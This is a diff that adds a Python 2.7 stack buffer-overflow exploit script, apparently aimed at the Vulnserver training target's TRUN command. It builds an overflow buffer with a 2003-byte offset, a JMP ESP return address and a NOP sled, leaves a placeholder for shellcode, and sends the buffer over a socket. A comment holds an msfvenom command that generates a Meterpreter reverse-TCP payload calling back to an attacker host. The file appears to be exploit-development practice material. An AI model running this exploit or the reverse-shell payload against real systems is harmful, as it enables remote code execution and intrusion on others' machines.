@@ -1,0 +1,23 @@
+  1 #!/usr/bin/python2.7
+  2 
+  3 import socket
+  4 
+  5 '''
+  6 625011AF
+  7 625011BB
+  8 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\    x00" -f python
+  9 '''
+ 10 
+ 11 
+ 12 buf = "TRUN /.:/" #Exploit
+ 13 buf += "A" * 2003 #Buffer Offset
+ 14 buf += "\xa0\x12\x50\x62"  #JMP ESP
+ 15 buf += "\x90" * 15 #NOP SLED
+ 16 buf += #SHELLCODE HERE
+ 17 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
+ 18 
+ 19 s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
+ 20 print s.recv(1024)   #print response
+ 21 s.send(buf)       #sends the variable buf
+ 22 print s.recv(1024)   #print response
+ 23 s.close()         #close the connection
